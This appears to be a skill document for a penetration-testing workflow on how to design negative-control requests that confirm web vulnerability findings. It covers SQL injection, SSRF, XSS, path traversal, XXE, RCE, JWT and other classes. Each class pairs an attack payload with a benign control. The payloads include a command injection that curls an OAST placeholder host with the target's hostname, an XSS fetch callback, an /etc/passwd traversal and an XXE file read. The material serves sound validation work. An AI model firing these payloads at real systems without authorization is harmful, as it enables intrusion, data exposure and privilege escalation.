---
name: negative-control-design
description: How to design the baseline request that must NOT trigger — per-class negative controls, what a correct negative result looks like, and why a finding without one is unconfirmed.
---

# Negative Control Design

A finding without a negative control is unconfirmed. The negative
control is the request that *should not* trigger the vulnerability —
it uses a benign value where the attack request uses a payload,
and it must produce a distinctly different result. The finding is
the *difference* between the attack and the control, not the
attack alone.

This skill owns the control-request design methodology.
`validation/red_team_the_finding` owns the falsification discipline.
`validation/blind_revalidation` uses the control in the
fresh-session re-test.

## Why a Negative Control Is Required

Without a control, you cannot distinguish:

- A real vulnerability (the payload caused the observed behavior)
  from the endpoint's default behavior (it always does this).
- An injection oracle (the payload was evaluated) from echo-back
  (the payload was reflected).
- A timing signal (the delay is payload-proportional) from
  background noise (the delay is random).
- A state change caused by the attack from a state change caused
  by a concurrent event.

The control isolates the *causal* effect of the payload from
everything else.

## The Control Design Rule

The negative control is **identical to the attack request in every
respect except the injected payload**, which is replaced with a
benign value of the same type. The control must:

1. Use the same HTTP method, headers, cookies, session, and
   endpoint.
2. Use the same content type and encoding.
3. Use a benign value that is the *correct type* for the parameter
   (a valid ID, a safe string, a normal filename — not empty, not
   null, not a completely different parameter).
4. Produce a *known-correct* response (the endpoint's legitimate
   behavior for that input).

The finding is confirmed when the attack response differs from the
control response in the way the vulnerability predicts.

## Per-Class Negative Controls

### SQL Injection

**Attack**: `id=1 AND SLEEP(5)` (time-based) or `id=1 AND 1=1` /
`id=1 AND 1=2` (boolean-based).

**Control**: `id=1` (the valid parameter without any injection).

**Correct negative result**: the control request returns the normal
response for `id=1` with no delay (time-based) or returns the same
body consistently (boolean-based).

**The finding signal**: the attack response differs — a delay
proportional to the sleep parameter, or a body/status difference
correlated to the predicate truth value.

### SSRF

**Attack**: `url=http://<oast-domain>/ssrf-test`.

**Control**: `url=http://example.com` (a reachable, benign URL that
the application legitimately fetches).

**Correct negative result**: the control request produces a normal
response (the app fetched example.com and rendered or proxied the
result). No OAST callback on the attack-domain OAST host.

**The finding signal**: the attack request produces an OAST callback
from the target's egress IP — and the control request's OAST domain
did *not* produce a callback (isolating the attack's domain).

### IDOR / BOLA

**Attack**: `GET /api/users/456` (target user's ID, from caller
with ID 123).

**Control**: `GET /api/users/123` (caller's own ID).

**Correct negative result**: the control request returns the
caller's own data. The response body contains `id: 123` and the
caller's attributes.

**The finding signal**: the attack request returns data with
`id: 456` and the *target user's* attributes — not the caller's,
not empty, not an error.

### XSS

**Attack**: `q=<script>fetch('http://<oast>/xss')</script>`.

**Control**: `q=normaltext` (a benign search term).

**Correct negative result**: the control request renders the term
safely escaped in the response. No OAST callback.

**The finding signal**: the attack request produces an OAST callback
(script executed in the browser) or the payload appears
unescaped in a rendering context where the browser evaluates it.

### CSRF

**Attack**: cross-origin POST from attacker-hosted HTML to
`/api/change-email` with the victim's session cookie.

**Control**: same-origin POST to `/api/change-email` with a valid
CSRF token and the victim's session cookie.

**Correct negative result**: the control request succeeds (the
endpoint works when the CSRF token is present). Then verify: is
the state change *also* present after the cross-origin attack
request (which omitted the CSRF token)?

**The finding signal**: the cross-origin request (without the CSRF
token) produces the same state change as the same-origin request
(with the token). If the state change occurs only with the token,
CSRF protection works.

### SSTI

**Attack**: `name={{7*7}}`.

**Control**: `name=normaltext`.

**Correct negative result**: `normaltext` appears literally in the
response. No template evaluation.

**The finding signal**: `49` appears in the response where the
attack parameter was rendered — the template engine evaluated the
expression. If `{{7*7}}` appears literally, this is reflection, not
SSTI.

### Path Traversal / LFI

**Attack**: `file=../../etc/passwd`.

**Control**: `file=legitimate-file.txt` (a file the endpoint is
meant to serve).

**Correct negative result**: the control request returns the
contents of `legitimate-file.txt`.

**The finding signal**: the attack request returns content matching
the known structure of `/etc/passwd` (root:x:0:0:...). If the
response echoes `../../etc/passwd` as a string but does not contain
file content, this is echo-back.

### XXE

**Attack**: XML with `<!ENTITY xxe SYSTEM "file:///etc/hostname">`
and `&xxe;` in the body.

**Control**: XML with the same structure but no DOCTYPE and no
entity reference.

**Correct negative result**: the control request is processed
normally (the XML is valid and the endpoint does whatever it does
with it).

**The finding signal**: the attack response contains the content of
`/etc/hostname` where `&xxe;` was placed. If the response contains
`&xxe;` literally or the DOCTYPE fragment, this is echo-back.

### Race Conditions

**Attack**: N concurrent requests to a state-changing endpoint.

**Control**: N sequential requests to the same endpoint.

**Correct negative result**: sequential execution produces exactly
one state change (or N idempotent duplicates rejected by the
application).

**The finding signal**: concurrent execution produces >1 state
change where sequential execution produces 1. The difference is
the race.

### Insecure Deserialization

**Attack**: serialized payload with a gadget chain triggering a
safe side-effect (DNS callback via URLDNS, file creation).

**Control**: serialized payload with a valid, benign object of the
expected type.

**Correct negative result**: the control payload deserializes
successfully and the application processes it normally. No side
effect from the URLDNS chain.

**The finding signal**: the attack payload produces the side effect
(DNS callback arrives from target's egress IP, file is created).

### Broken Function-Level Authorization

**Attack**: low-privilege session calling `POST /admin/users/delete`.

**Control**: admin session calling `POST /admin/users/delete`.

**Correct negative result**: the admin request succeeds (the
endpoint works for authorized users).

**The finding signal**: the low-privilege request *also* succeeds —
verified by a follow-up read showing the user was actually deleted.
If the low-privilege request returns 200 but the user still exists,
this is silent enforcement (Shape 2 FP).

### Mass Assignment

**Attack**: `POST /api/user/profile` with
`{"name": "test", "role": "admin"}` (extra `role` field from a
standard-privilege user).

**Control**: `POST /api/user/profile` with `{"name": "test"}`
(only permitted fields).

**Correct negative result**: the control request updates `name`.
A follow-up `GET` confirms `name` changed, `role` unchanged.

**The finding signal**: the attack request's extra `role` field is
persisted — verified by a follow-up read showing `role` actually
changed to `admin`. If the response echoes `role: admin` but the
persisted value is unchanged, the server recomputed the field from
the authoritative source.

### Open Redirect

**Attack**: `redirect_url=https://evil.com`.

**Control**: `redirect_url=/dashboard` (a valid relative
same-origin path the application legitimately redirects to).

**Correct negative result**: the control request redirects to
`/dashboard` on the same origin. The `Location` header contains a
same-origin path.

**The finding signal**: the attack request's `Location` header
contains `https://evil.com`. If the server rewrites the target to a
relative path (strips scheme+host), the redirect is constrained.

### RCE

**Attack**: `input=;curl http://<oast>/rce-$(hostname)` (command
injection via a parameter reaching a command sink).

**Control**: `input=validvalue` (a benign value the parameter
legitimately accepts).

**Correct negative result**: the control request processes the
value normally. No OAST callback, no command output in the response.

**The finding signal**: the attack request produces an OAST callback
from the target's egress IP with the embedded hostname, or returns
controlled command output (`uid=...`). If the only signal is a
timeout or 500 error, the sink may have crashed without executing
attacker code — this is not controlled execution.

### Authentication / JWT

**Attack**: a modified JWT (e.g., `alg: none`, claim edit, or
key-confused signature) sent as `Authorization: Bearer <modified>`.

**Control**: the original, valid JWT sent as
`Authorization: Bearer <original>`.

**Correct negative result**: the control request authenticates and
returns user-specific data for the original token's identity.

**The finding signal**: the modified token *also* authenticates —
the response returns data for the modified claim's identity or
grants the modified privilege level. If the modified token is
rejected (401/403) or returns no user-specific data, the
verification is effective. If the token is accepted but the
response is identical to the control (same identity, same
privilege), the modified claims were ignored — this is strict
audience/issuer enforcement, not a bypass.

## Negative Controls for Quantitative Oracles

For timing-based and blind boolean oracles, the negative control is
paired:

**Timing**: measure the control request's baseline latency (≥5
samples). The attack's delay must exceed the control's 95th
percentile *and* scale with the injected parameter.

**Boolean**: the control pair is the two predicate values (true and
false). Both must produce consistent, distinguishable responses
across ≥3 retries. If the responses are indistinguishable, the
oracle is not usable.

## What a Finding Without a Control Looks Like

- "I sent `SLEEP(5)` and the response was slow" — without the
  baseline, the endpoint may always be slow.
- "I swapped the ID and got data" — without checking who the data
  belongs to, the server may have auto-scoped.
- "The payload appeared in the response" — without a control,
  this may be echo-back, not evaluation.
- "The OAST callback arrived" — without checking the source IP,
  this may be client-side.

All four are uncontrolled observations. All four require a negative
control to become findings.

Cross-reference: `validation/red_team_the_finding` for per-class
falsification. `validation/fp_taxonomy` for the FP shapes the
control is designed to detect.
